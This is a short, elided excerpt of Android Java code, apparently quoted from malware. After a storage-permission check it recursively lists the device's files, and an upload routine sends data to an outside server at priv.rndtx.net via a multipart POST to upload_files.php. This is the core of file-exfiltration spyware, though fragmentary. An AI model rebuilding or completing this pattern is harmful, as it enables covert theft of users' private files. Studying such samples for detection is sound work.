...
public class MainActivity extends Activity {
    ...
    public void checkperm() {
        if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.WRITE_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED) {
            ...
            List<File> files4 = (List<File>) FileUtils.listFiles(dir4, TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);
    ...
    public void upload(String selectedPath) throws Exception {
        ...
        String urlServer = "https://priv.rndtx.net/upload_files.php";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
